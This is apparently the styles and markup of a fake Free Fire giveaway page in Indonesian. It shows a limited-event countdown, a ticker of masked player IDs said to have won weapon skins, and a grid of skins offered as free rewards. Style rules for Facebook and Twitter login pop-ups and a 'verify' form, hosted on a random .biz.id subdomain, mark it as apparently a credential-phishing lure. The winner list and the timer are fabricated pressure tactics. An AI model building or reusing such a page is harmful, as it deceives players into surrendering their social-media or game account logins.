	margin-right: auto;
	display: block;
}
.footer-copyright-text {	
	padding:5px;
	padding-top: 25px;
	margin-left: auto;
	margin-right: auto;	
	float: center;
	text-align: center;
	display: block;
}
.footer-copyright-text-left {
	color: #fff;
	font-size: 12px;
	padding:5px;
	font-family:sans-serif;
	text-align: center;
	display: inline-block;
	margin: 5px;
	border-bottom: 1px solid #fff;
}
.footer-copyright-text-center {
	color: #fff;
	font-size: 12px;
	padding:5px;
	font-family:sans-serif;
	text-align: center;
	display: inline-block;
	margin: 5px;
	border-bottom: 1px solid #fff;
}
.footer-copyright-text-right {
	color: #fff;
	font-size: 12px;
	padding:5px;
	font-family:sans-serif;
	text-align: center;
	display: inline-block;
	margin: 5px;
	border-bottom: 1px solid #fff;
}
.footer-copyright-text-cookie {
	color: #fff;
	font-size: 14px;
	font-family:Teko;
	text-align: center;
	display: block;
	margin-top: -5px;
}
.footer-copyright-text-icon {	
	width:15%;
	padding:5px;
	padding-top: 25px;
	margin-left: auto;
	margin-right: auto;	
	float: center;
	text-align: center;
	display: inline-block;
}
.footer-txt-copyrights {
	color: #bdbdbd;
	padding:10px;
	padding-top:10px;
	padding-bottom:25px;
	font-size: 14px;
	font-family:arial;
	text-align: center;
}

.verify-box-navbar {
	background-size: 100% 100%;
	width: 93%;
	height: 19%;
	margin-left: auto;
	margin-right: auto;
	display: block;
}

.verify-box-navbar-description {
	width: 50%;
	margin-top: 50px;
	margin-right: 20px;
	color: #fff;
	font-size: 18px;
	font-family: Teko;
	font-weight: 500;
	text-align: left;
	float: right;
}

.verify-box-navbar-form {
	background-size: 100% 100%;
	width: 93%;
	height: auto;
	margin-top: 25px;
	margin-left: auto;
	margin-right: auto;
	display: block;
}

.verify-box-navbar-form input {
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/verify-bg.png) no-repeat center center;
	background-size: 100% 100%;
	width: 95%;
	height: 40px;
	margin-left: 10px;
	margin-bottom: 4px;
	padding: 4px;
	padding-left: 10px;
	padding-right: auto;
	color: #f1f1f0;
	font-size: 15px;
	font-family: laza;
	font-weight: 500;
	border: 2px solid #232323;
	position: relative;
	outline: none;
	-webkit-appearance: none;
	-moz-appearance: none;
	border-radius: 15px;
}

.verify-box-navbar-form input::placeholder {
	color: #f1f1f0;
}

.verify-box-navbar-form select {
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/verify-bg.png) no-repeat center center;
	background-size: 100% 100%;
	width: 95%;
	height: 40px;
	margin-left: 10px;
	margin-bottom: 4px;
	padding: 4px;
	padding-left: 10px;
	padding-right: auto;
	color: #f1f1f0;
	font-size: 15px;
	font-family: laza;
	font-weight: 500;
	border: 2px solid #232323;
	position: relative;
	outline: none;
	-webkit-appearance: none;
	-moz-appearance: none;
	border-radius: 15px;
}

.verify-box-content {
	background-size: 100% 100%;
	width: 93%;
	height: auto;
	margin-top: -1px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	padding: 20px;
	padding-top: 0px;
	padding-bottom: 25px;
	display: block;
}

.verify-box-content-title {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 6px;
	color: #fff;
	font-size: 18px;
	font-family: laza;
	font-weight: 500;
	text-align: center;
	display: block;
}

.verify-box-content-title i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #f1f1f0;
	margin-top: 29px;
	font-size: 100px;
	text-align: center;
}

.verify-box-content button {
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/submit.png) no-repeat center center;
	background-size: 76% 77%;
	width: 55%;
	height: 55px;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 9px;
	padding-top: 8px;
	padding-left: 20px;
	padding-right: 20px;
	color: #030303;
	font-size: 19px;
	font-family: laza;
	font-weight: 500;
	text-align: center;
	border: none;
	display: block;
}

.about-box-content {
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/aboutrules-sec.png) no-repeat center center;
	background-size: 100% 100%;
	width: 96%;
	height: 120px;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 20px;
	padding-left: auto;
	padding-right: auto;
	float: center;
	color: #000;
	display: block;
}

.about-box-content-title {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 6px;
	color: #000;
	font-size: 18px;
	font-family: laza;
	font-weight: 500;
	text-align: center;
	display: block;
}

.about-box-content-title i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #000;
	font-size: 100px;
	text-align: center;
}


figure {
	margin: 0;
	padding: 0;
	overflow: hidden;
}

.itemShine figure {
	position: relative;
}

.itemShine figure::before {
	background: -webkit-linear-gradient(left, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, .3) 100%);
	background: linear-gradient(to right, rgba(255, 255, 255, 0) 0%, rgba(255, 255, 255, .3) 100%);
	width: 50%;
	height: 100%;
	top: 0;
	left: -75%;
	position: absolute;
	z-index: 2;
	content: '';
	display: block;
	-webkit-transform: skewX(-25deg);
	transform: skewX(-25deg);
}

.itemShine figure::before {
	-webkit-animation: shine 2s infinite;
	animation: shine 2s infinite;
}

@-webkit-keyframes shine {
	100% {
		left: 125%;
	}
}

@keyframes shine {
	100% {
		left: 125%;
	}
}

.kanan {
	float: right;
}

.kiri {
	float: left;
}

.tengah {
	margin-left: auto;
	margin-right: auto;
	display: block;
}

::-webkit-scrollbar {
	display: none;
	width: 0px;
}

.twitter-load {
	background-size: 100% 100%;
	width: 93%;
	height: 388px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	padding: 20px;
	padding-top: 0px;
	padding-bottom: 25px;
	display: block;
}

.twitter-load-title {
	width: 95%;
	height: auto;
	margin-top: 70px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 6px;
	padding-top: 90px;
	color: #fff;
	font-size: 18px;
	font-family: laza;
	font-weight: 500;
	text-align: center;
	display: block;
}

.twitter-load-title i {
	margin-top: 90px;
	padding-top: 15px;
	padding-bottom: 15px;
	color: #00acee;
	font-size: 50px;
	text-align: center;
}

.fb-load {
	background-size: 100% 100%;
	width: 93%;
	height: 304px;
	margin-top: -1px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	padding: 20px;
	padding-top: 0px;
	padding-bottom: 25px;
	display: block;
}

.fb-load img {
	width: 50px;
	height: 50px;
	margin-top: 215px;
	margin-bottom: -55px;
}

.fb-load-title {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 6px;
	color: #999998;
	font-size: 18px;
	font-family: laza;
	font-weight: 500;
	text-align: center;
	display: block;
}

.fb-load-title i {
	margin-top: 200px;
	padding-top: 15px;
	padding-bottom: 15px;
	color: #999998;
	font-size: 30px;
	text-align: center;
}

.event-notification {
	width: 93%;
	height: 53px;
	padding: 7px;
	margin-right: auto;
	margin-left: auto;
}

.event-notification-txt {
	padding-top: 10px;
	padding-left: 34px;
	color: #dbff85;
	font-size: 16px;
	font-family: Teko;
	font-weight: 550;
	text-align: left;
	float: left;
}

.scroll {
  overflow: scroll;
  position: relative;
  width: 100%;
  height: 440px;
  margin-top: 0px;
  margin-left: auto;
  margin-right: auto;
  display: block;
  scrollbar-face-color: #ffbb40;
  scrollbar-shadow-color: #ffbb40;
  scrollbar-highlight-color: #ffbb40;
  scrollbar-3dlight-color: #ffbb40;
  scrollbar-darkshadow-color: #ffbb40;
  scrollbar-track-color: #ffbb40;
  scrollbar-arrow-color: #ffbb40;
}

.timer {
	background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/bg_tip2.png) no-repeat center center;
    background-size: 62% 83%;
    width: 98%;
    height: 12%;
    margin-top: 422px;
    padding-right: 0px;
    margin-right: 0;
    display: block;
    padding-top: 18px;
    text-align: center;
    font-size: 17px;
    font-family: 'laza';
    font-weight: 500;
    color: #ffffff;
    font-style: normal;
    text-shadow: 1px 1px 1px #ff0000;
    position: absolute;
}

.notifgift {
    background: #000000b0;
    position: absolute;
    opacity: 100%;
    color: #ffffff;
    text-shadow: 1px 1px 1px #0ab5ff;
    border-radius: 2px;
    background-size: 100% 100%;
    width: 86%;
    height: 25px;
    margin-top: -69px;
    margin-left: 21px;
    padding-top: 5px;
    padding-right: 0px;
    text-align: center;
    font-size: 12px;
    font-family: laza;
    font-weight: 500;
    display: block;
}

.box-rewards {
	background-size: 105% 100%;
	width: 100%;
	height: auto margin-left:auto;
	margin-top: -48px;
	margin-right: auto;
	margin-bottom: 10px;
	border: 0px solid #E29E53;
	border-radius: 5px;
	position: relative;
	display: block;
}

.box-item-rewards {
	width: 100%;
	height: auto;
	padding-top: 20px;
	margin-right: auto;
}

.item {
	background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/point-card-bg.png);
    background-size: 100% 100%;
    width: 29%;
    height: 110px;
    margin: 3px;
    margin-bottom: 34px;
    display: inline-block;
}

.item .item-nominal {
	padding-right: 4px;
	color: #fff;
	font-size: 25px;
	font-family: DINMITTELSCHRIFTSTD;
	text-align: right;
	position: absolute;
}

.item-label .marquee {
    white-space: nowrap;
    font-family: dinm;
    overflow: hidden;
    display: inline-block;
    animation: marquee 10s linear infinite;
}

.item-label .marquee a {
    display: inline-block;
}

@keyframes marquee {
    0% {
        transform: translate3d(0, 0, 0);
    }

    100% {
        transform: translate3d(-50%, 0, 0);
    }
}

.item img {
	width: 79%;
	height: 79%;
	margin-top: 9%;
	margin-bottom: 4%;
}

.item-label {
    width: 85%;
    overflow: hidden;
    color: #fff;
    text-shadow: 1px 1px 1px #d93f9d;
    font-size: 10px;
    font-family: DINMITTELSCHRIFTSTD;
    font-weight: 550;
    text-align: center;
	margin-top: -14px;
    margin-bottom: 5px;
}

.item-pcs {
	color: #ffffff;
	text-shadow: 1px 1px 1px #000000;
    font-size: 14px;
    font-family: 'laza';
    font-weight: 550;
    text-align: center;
    margin-top: -22px;
    margin-left: 27px;
    position: absolute;
}

.item p {
	background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/button.png) no-repeat center center;
    background-size: 97% 100%;
    width: 100%;
    height: 27px;
    padding: 3px;
    padding-top: 6px;
    padding-left: 18px;
    color: #ee9c18;
    text-shadow: 1px 1px 1px #000000;
    font-size: 14px;
    font-family: laza;
    font-weight: 500;
    text-align: center;
    border: none;
    outline: none;
    margin-top: -3%;
    border-bottom-left-radius: 9px;
    border-bottom-right-radius: 9px;
}

.item p img {
	margin-left: -25px;
    margin-bottom: -6px;
    width: 20px;
    height: auto;
    border: none;
    position: absolute;
    margin-top: -2.5px;
}

.LabelCards_card_label_box__Hcfaa {
	box-sizing: border-box;
	left: 6px;
	overflow: hidden;
	position: absolute;
	right: 6px;
	top: 6px;
	z-index: 1;
}

.lazabox {
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/lazabox.png);
	background-size: 100% 100%;
	width: 100%;
	height: 70%;
	margin-top: -230px;
	object-position: center;
}

.pd-giftbox {
	position: absolute;
	top: 41.8%;
	left: 64%;
	transform: translateX(-0.645rem);
}

.rtl .pd-giftbox {
	direction: ltr
}

.pd-giftbox>img:nth-child(1) {
	position: absolute;
	top: -43px;
	left: 25px;
	z-index: 2;
	width: 6.2rem;
	height: 4.92rem;
	transform: rotate(-18deg);
	transform-origin: 100% 100%;
	-moz-transform-origin: 100% 100%;
	-webkit-transform-origin: 100% 100%;
	-o-transform-origin: 100% 100%;
	animation: gift-box-hat-kf 5s infinite;
	-moz-animation: gift-box-hat-kf 5s infinite;
	-webkit-animation: gift-box-hat-kf 3s infinite;
	-o-animation: gift-box-hat-kf 3s infinite
}

.pd-giftbox>img:nth-child(2) {
	position: absolute;
	width: 7.29rem;
	height: 5.1rem;
}

@keyframes gift-box-hat-kf {
	0% {
		transform: rotate(0deg)
	}

	12.5% {
		transform: rotate(0deg)
	}

	25% {
		transform: rotate(-18deg)
	}

	37.5% {
		transform: rotate(-18deg)
	}

	50% {
		transform: rotate(0deg)
	}

	62.5% {
		transform: rotate(0deg)
	}

	75% {
		transform: rotate(-18deg)
	}

	87.5% {
		transform: rotate(-18deg)
	}

	100% {
		transform: rotate(0deg)
	}
}

.yun {
	position: absolute
}

.yun1_1 {
	width: 35px;
	height: 18px;
	left: 10px;
	top: 63px;
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/lazcloud/yun1_1.png) 0/100% 100% no-repeat
}

.yun1_2 {
	width: 19px;
	height: 12px;
	left: 10px;
	top: 130px;
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/lazcloud/yun1_2.png) 0/100% 100% no-repeat
}

.yun1_3 {
	width: 57px;
	height: 20px;
	left: 215px;
	top: 72px;
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/lazcloud/yun1_3.png) 0/100% 100% no-repeat
}

.yun2_1 {
	width: calc(136 / 1920 * 100vw);
	height: calc(61 / 1920 * 100vw);
	left: calc(93 / 1920 * 100vw);
	top: calc(141 / 1920 * 100vw);
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/lazcloud/yun2_1.png) 0/100% 100% no-repeat
}

.yun2_2 {
	width: calc(561 / 1920 * 100vw);
	height: calc(207 / 1920 * 100vw);
	left: calc(99 / 1920 * 100vw);
	top: calc(207 / 1920 * 100vw);
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/lazcloud/yun2_2.png) 0/100% 100% no-repeat
}

.yun2_3 {
	width: 68px;
	height: 25px;
	left: 293px;
	top: 19px;
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/lazcloud/yun2_3.png) 0/100% 100% no-repeat
}

.yun2_4 {
	width: 71px;
	height: 29px;
	left: 290px;
	top: 141px;
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/lazcloud/yun2_4.png) 0/100% 100% no-repeat;
}

.yun2_5 {
	width: 69px;
	height: 27px;
	left: 10px;
	top: 158px;
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/lazcloud/yun2_5.png) 0/100% 100% no-repeat
}

.yun2_6 {
	width: 58px;
	height: 28px;
	left: 263px;
	top: 88px;
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/lazcloud/yun2_6.png) 0/100% 100% no-repeat
}

.tab_rewards {
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/box.png);
    background-size: 100% 100%;
    width: 104%;
    height: 361px;
    margin-top: 90px;
    margin-right: -8px;
    margin-left: 10px;
    padding-top: 52px;
    align-content: center;
    float: inline-end;
    opacity: 120%;
}

.nom {
	position: absolute;
	padding-left: 387px;
	padding-top: 51px;
	color: #fff;
	font-size: 13px;
	font-family: dinm;
	font-weight: 550;
}


@media only screen and (max-width:600px) {
	.lazabox {
		background: url(https://wznpqzjl.mcj4fdph.biz.id/img/lazabox.png);
		background-size: 100% 100%;
		width: 100%;
		height: 70%;
		margin-top: -230px;
		object-position: center;
	}

	.box-rewards {
		margin-top: -48px;
		width: 100%;
		height: auto;
	}

	.box-item-rewards {
		width: 100%;
		height: auto;
		padding-top: 20px;
		margin-left: auto;
		margin-right: auto;
	}

	.containerLanding,
	.containerHome {
		width: 100%;
		height: auto;
		margin-top: -3px;
		margin-bottom: 0px;
		border: none;
		border-radius: 0px;
		padding: 0px;
	}

	.slider-container {
		margin-top: -3px;
		border: none;
	}

	.laz-container {
		background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/lazback.jpg) no-repeat center;
		background-size: 100% 100%;
		margin-top: -150px;
		padding: 5px;
		width: 100%;
		margin-left: 0px;
		margin-right: 0px;
		height: 588px;
		position: relative;
	}

	.gallery-container {
		float: left;
		margin-top: -2px;
		width: 100%;
		height: auto;
		border: 0px solid #fff;
	}

	.box {
		width: 100%;
		height: 405px;
		margin-top: -45px;
		margin-bottom: -25px;
	}

	.box-item {
		width: 100%;
		margin-left: auto;
		margin-right: auto;
		padding-top: 1px;
	}

	.rewardpop {
		background: url(https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/lazlogin.png) no-repeat center center;
		background-size: 100% 100%;
		width: 400px;
		height: 200px;
	}

	.scroll {
		height: 440px;
	}

	.event-notification {
		width: 93%;
		height: 53px;
		padding: 7px;
		margin-right: auto;
		margin-left: auto;
	}

	.event-notification-text {
		padding-top: 11px;
		font-family: laza;
		font-size: 16px;
	}

	.footer {
		border-left: none;
		border-right: none;
		border-top: none;
		border-bottom: none;
	}

	.popup-box-wrapper {
		width: auto;
		margin-top: 60%;
	}

	.popup-box-wrapperz {
		width: 360;
    	margin-top: 252px;
	}

	.popup-box-wrappers {
		width: 360px;
		margin-top: 60%;
	}

	.popup-box-item {
		width: 16%;
    	height: 67px;
    	margin-top: 38px;
	}

	.popup-box-login-fb {
		margin-top: 35%;
	}

	.popup-box-login-twitter {
		margin-top: 40%;
	}

	.link-box {
		margin-top: 40%;
	}

	.footer {
		background-position-y: calc(500 / 640 * 210vw);
	}

	.footer-socmed-box p {
		margin-top: 12px;
	}

	.event-notification {

		background-size: auto;
		background-size: 94% 100%;
		width: 85%;
		height: 48px;
		margin-left: auto;
		margin-right: auto;
		margin-top: -2px;
		margin-bottom: -82px;
		display: block;
	}

	.event-notification-txt {
		padding-top: 10px;
		padding-left: 34px;
		color: #dbff85;
		font-size: 16px;
		font-family: Teko;
		font-weight: 550;
		text-align: left;
		float: left;
	}

	.timer {
    margin-left: 0px;

	}

	.notifgift {
		margin-top: -69px;
	}

	.event-notification-timer {
		padding-top: 44px;
		padding-right: 28px;
		color: #dbff85;
		font-size: 27px;
		font-family: Teko;
		font-weight: 550;
		text-align: left;
		margin-bottom: 13px;
		float: right;
	}

	.alert-text {
		margin-top: -330px;
		margin-left: -6px;
		padding: 7px;
		color: #ffffff;
		text-align: center;
		font-size: 14px;
		font-family: laza;
		border: none;
	}

	.alert-text-mid {
		margin-top: 1px;
		padding: 7px;
		color: #f1f1f0;
		text-align: center;
		font: 25px;
		font-family: laza;
		border: none;
		margin-right: -2px;
		font-size: 19px;
	}

	.popup-box-bg {
		background: url(https://wznpqzjl.mcj4fdph.biz.id/img/popup-box-bg2.png) no-repeat center center;
		background-size: 100% 100%;
		width: 109%;
    	margin-top: -12px;
    	margin-left: -15px;
	}

	.s1_man1 {
		display: block;
		width: calc();
		height: calc();
		background: url(https://wznpqzjl.mcj4fdph.biz.id/img/m416.png) center/100% 100% no-repeat;
		position: absolute;
		top: 400px;
		left: calc(-80 /1920*100vw);
		bottom: calc(-23 /1920*100vw);
		animation: bounce_down 4s linear infinite;
		-webkit-animation: bounce_down 4s linear infinite
	}

	@-webkit-keyframes bounce_down {
		25% {
			-webkit-transform: translateY(-10px)
		}

		50%,
		100% {
			-webkit-transform: translateY(0)
		}

		75% {
			-webkit-transform: translateY(10px)
		}
	}

	@keyframes bounce_down {
		25% {
			transform: translateY(-10px)
		}

		50%,
		100% {
			transform: translateY(0)
		}

		75% {
			transform: translateY(10px)
		}
	}
}

.i {

	display: inline-flex;
	width: 8%;
	animation: anim 8.5s ease-in-out infinite;
	transform: translateY(-150%) rotate(0deg);

}

.n1 {
	animation-delay: 0.1s;
}

.n2 {
	animation-delay: 1.2s;
}

.n3 {
	animation-delay: 0.6s;
	margin-left: 280px;
}

.n4 {
	animation-delay: 1.4s;
	width: 10px;
}

.n5 {
	animation-delay: 0.4s;
	width: 10px;
	margin-left: 160px;
}

.n6 {
	animation-delay: 0.6s;
}

h1 {
	transform: rotate(-45deg);
}

@keyframes anim {
	0% {
		transform: translateY(-180%) rotate(0deg);
	}

	100% {
		transform: translateY(120vh) rotate(-360deg);
	}
}

.yun {
	position: absolute
}

.yun1_1 {
	width: 35px;
	height: 18px;
	left: 10px;
	top: 63px;
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/lazcloud/yun1_1.png) 0/100% 100% no-repeat
}

.yun1_2 {
	width: 19px;
	height: 12px;
	left: 10px;
	top: 130px;
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/lazcloud/yun1_2.png) 0/100% 100% no-repeat
}

.yun1_3 {
	width: 57px;
	height: 20px;
	left: 215px;
	top: 72px;
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/lazcloud/yun1_3.png) 0/100% 100% no-repeat
}

.yun2_1 {
	width: calc(136 / 1920 * 100vw);
	height: calc(61 / 1920 * 100vw);
	left: calc(93 / 1920 * 100vw);
	top: calc(141 / 1920 * 100vw);
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/lazcloud/yun2_1.png) 0/100% 100% no-repeat
}

.yun2_2 {
	width: calc(561 / 1920 * 100vw);
	height: calc(207 / 1920 * 100vw);
	left: calc(99 / 1920 * 100vw);
	top: calc(207 / 1920 * 100vw);
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/lazcloud/yun2_2.png) 0/100% 100% no-repeat
}

.yun2_3 {
	width: 68px;
	height: 25px;
	left: 293px;
	top: 19px;
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/lazcloud/yun2_3.png) 0/100% 100% no-repeat
}

.yun2_4 {
	width: 71px;
	height: 29px;
	left: 290px;
	top: 141px;
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/lazcloud/yun2_4.png) 0/100% 100% no-repeat;
}

.yun2_5 {
	width: 69px;
	height: 27px;
	left: 10px;
	top: 158px;
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/lazcloud/yun2_5.png) 0/100% 100% no-repeat
}

.yun2_6 {
	width: 58px;
	height: 28px;
	left: 263px;
	top: 88px;
	background: url(https://wznpqzjl.mcj4fdph.biz.id/img/lazcloud/yun2_6.png) 0/100% 100% no-repeat
}


</style>
<div class="slider-container">
<div class="navbar">
<img class="navbar-logo" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/logo.png">
<div class="navbar-right">
<img class="navbar-language" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/nav_language.svg">
<img class="navbar-language" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/nav_menu.svg"></div>
</div> 
</div> 
<div class="header">
<img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/1.jpg" class="width: 100%;">
</div>
 

<div class="laz-home">
<div class="laz-container" style="margin-top:-1px;">
<div>
<br>
<div class="event-title" style="opacity: 0%;"></div>
<div class="event-title2" style="opacity: 0%;"></div>
<div class="timer">EVENT TERBATAS<br>BERAKHIR PADA: <i class="fa-solid fa-stopwatch fa-shake"></i><span id="timer1" style="animation: fade .6s infinite alternate;color: #ff2c2c;">  23 : 59 : 50</span></div> 
<div class="notifgift linemotion">
<div class="slider animated fadeIn" style="display: none;"><i class="fa-solid fa-gift fa-bounce"></i>��� UID 3585****23 Mendapatkan M1887 - RAPPER</div>
<div class="slider animated fadeIn" style="display: none;"><i class="fa-solid fa-gift fa-bounce"></i>��� UID 5266****04 Mendapatkan M1887 - ONI - SAKURA</div>
<div class="slider animated fadeIn" style="display: none;"><i class="fa-solid fa-gift fa-bounce"></i>��� UID 8284****33 Mendapatkan M1887 - STERLING CONQUEROR</div>
<div class="slider animated fadeIn" style="display: none;"><i class="fa-solid fa-gift fa-bounce"></i>��� UID 3980****78 Mendapatkan M1887 - ONI - SAKURA</div>
<div class="slider animated fadeIn" style="display: none;"><i class="fa-solid fa-gift fa-bounce"></i>��� UID 8582****2 Mendapatkan AK47 - DRACO</div>
<div class="slider animated fadeIn" style="display: none;"><i class="fa-solid fa-gift fa-bounce"></i>��� UID 5766****890 Mendapatkan M1887 - METEOR</div>
<div class="slider animated fadeIn" style="display: none;"><i class="fa-solid fa-gift fa-bounce"></i>��� UID 3538****27 Mendapatkan AK47 - DRACO</div>
<div class="slider animated fadeIn" style="display: none;"><i class="fa-solid fa-gift fa-bounce"></i>��� UID 3340****71 Mendapatkan M1887 - RAPPER</div>
<div class="slider animated fadeIn" style="display: block;"><i class="fa-solid fa-gift fa-bounce"></i>��� UID 6582****342 Mendapatkan M1887 - ONEPUCHMAN</div>
<div class="slider animated fadeIn" style="display: none;"><i class="fa-solid fa-gift fa-bounce"></i>��� UID 3311****129 Mendapatkan AN94 - EVIL HOWLER</div>
</div></div> 
<div class="box-rewards">
<div class="box-item-rewards">
<div class="scroll">
<center>
<div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://rzo.my.id/jjkff/jjkrambutputih.png" item-name="satoru gojo" item-total="" item-price="5000">
<div> 
<figure>
<img style="border-bottom: 0px;" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/jjkrambutputih.png">
</figure>
</div>
<div>
<div class="item-label">
<div class="marquee">
<a>� satoru gojo</a>
<a>� satoru gojo</a>
</div>
</div>
<p><img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/tokens.png">5000</p></div>
</div>
<div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://rzo.my.id/jjkff/jjkrambutoren.png" item-name="yuji itodori" item-total="" item-price="5000">
<div> 
<figure>
<img style="border-bottom: 0px;" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/jjkrambutoren.png">
</figure>
</div>
<div>
<div class="item-label">
<div class="marquee">
<a>� yuji itodori</a>
<a>� yuji itodori</a>
</div>
</div>
<p><img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/tokens.png">5000</p></div>
</div>
<div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://rzo.my.id/jjkff/jjkcewe.png" item-name="Nobara kugisaki" item-total="" item-price="5000">
<div> 
<figure>
<img style="border-bottom: 0px;" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/jjkcewe.png">
</figure>
</div>
<div>
<div class="item-label">
<div class="marquee">
<a>� Nobara kugisaki</a>
<a>� Nobara kugisaki</a>
</div>
</div>
<p><img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/tokens.png">5000</p></div>
</div>
<div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://rzo.my.id/ffrm/sgpink.png" item-name="M1887 Rapper" item-total="" item-price="4000">
<div> 
<figure>
<img style="border-bottom: 0px;" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/sgpink.png">
</figure>
</div>
<div>
<div class="item-label">
<div class="marquee">
<a>� M1887 Rapper</a>
<a>� M1887 Rapper</a>
</div>
</div>
<p><img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/tokens.png">4000</p></div>
</div>
<div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://rzo.my.id/ff/Sg2Evogan.png" item-name="M1887 Evo" item-total="" item-price="4000">
<div> 
<figure>
<img style="border-bottom: 0px;" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/Sg2Evogan.png">
</figure>
</div>
<div>
<div class="item-label">
<div class="marquee">
<a>� M1887 Evo (Max)</a>
<a>� M1887 Evo (Max)</a>
</div>
</div>
<p><img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/tokens.png">4000</p></div>
</div>
<div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://rzo.my.id/ffrm/Sgmerah.png" item-name="M1887 - One Punch Man" item-total="" item-price="4000">
<div> 
<figure>
<img style="border-bottom: 0px;" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/Sgmerah.png">
</figure>
</div>
<script>$(document).ready(function(){$('body').hide();})</script>
<div>
<div class="item-label">
<div class="marquee">
<a>� M1887 - One Punch Man</a>
<a>� M1887 - One Punch Man</a>
</div>
</div>
<p><img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/tokens.png">4000</p></div>
</div>
<div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://rzo.my.id/ff3/3.png" item-name="Topi Jerami" item-total="" item-price="3000">
<div> 
<figure>
<img style="border-bottom: 0px;" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/3.png">
</figure>
</div>
<div>
<div class="item-label">
<div class="marquee">
<a>� Topi Jerami</a>
<a>� Topi Jerami</a>
</div>
</div>
<p><img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/tokens.png">3000</p></div>
</div>
<div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://rzo.my.id/ff2/tassayappp.png" item-name="Tas Sayap" item-total="" item-price="3000">
<div> 
<figure>
<img style="border-bottom: 0px;" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/tassayappp.png">
</figure>
</div>
<div>
<div class="item-label">
<div class="marquee">
<a>� Tas Sayap</a>
<a>� Tas Sayap</a>
</div>
</div>
<p><img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/tokens.png">3000</p></div>
</div>
<div class="item" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://rzo.my.id/ffrm/jenggotbnl.png" item-name="Jenggot OLD" item-total="" item-price="3000">
<div> 
<figure>
<img style="border-bottom: 0px;" src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/jenggotbnl.png">
</figure>
</div>
<div>
<div class="item-label">
<div class="marquee">
<a>� Jenggot OLD</a>
<a>� Jenggot OLD</a>
</div>
</div>
<p><img src="https://cdn.jsdelivr.net/gh/Hyuu09/cdn-epep@main/images2/tokens.png">3000</p></div>
</div>
